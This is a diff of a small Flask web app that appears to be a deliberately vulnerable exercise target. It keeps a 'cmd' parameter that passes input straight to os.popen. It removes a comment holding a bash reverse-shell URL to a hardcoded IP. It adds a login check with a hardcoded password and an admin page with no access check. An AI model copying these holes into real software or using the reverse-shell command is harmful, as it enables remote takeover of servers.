@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, session
 import os
 import argparse
 
@@ -19,22 +19,19 @@ app.config.update(
 #    SESSION_COOKIE_SAMESITE='None',
     SESSION_COOKIE_NAME='SiteCookie'
 )
-connected = set()
-
-submissionKey = 'fcf62432f63122d5b7a72e88af82f1ba'
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-v", "--verbosity", action="count", default=0, help="be more verbose")
 args, unknown = parser.parse_known_args()
 
-hostname = stream.read()
-
 @app.route("/", methods=["GET","POST"])
+# defines behavior for clients requesting /
 def index():
     sourceIP = request.remote_addr
     return render_template("index.html")
 
 @app.route("/aboutus.html", methods=["GET","POST"])
+# defines behavior for clients requesting /aboutus.html
 def aboutus():
     sourceIP = request.remote_addr
     return render_template("index.html")
@@ -54,7 +51,6 @@ def maintenance():
         for key in dict:
             print ('form key '+dict[key])
     if "cmd" in request.args:
-        # shell like https://torch-3.ue.r.appspot.com/?cmd=bash+-c+%27/bin/bash+-i+%3E%26+/dev/tcp/54.190.32.85/8080+0%3E%261%27
         output = os.popen(request.args.get("cmd")).read()
     else:
         # stream = os.popen('ls -l')
@@ -69,6 +65,25 @@ def maintenance():
     responseVars["site"] = site
     responseVars["playerID"] = playerid
     return render_template('index.html', **responseVars)
+
+@app.route('/login.html', methods=["GET","POST"])
+# defines behavior for clients requesting /login.html
+def login():
+    if request.method == "POST":
+        if request.form['username'] == "thebob" and request.form['password'] == "p@$$w0rd1":
+            session["user"] = "thebob"
+            resp = make_response(render_template('admin.html'))
+            return resp
+        else:
+            error = "Invalid username or password"
+            return render_template('login.html', error=error)    
+    else:
+        return render_template('login.html')
+
+@app.route('/admin.html', methods=["GET","POST"])
+# defines behavior for clients requesting /login.html
+def admin():
+    return render_template("admin.html")
 
 
 if __name__ == "__main__":
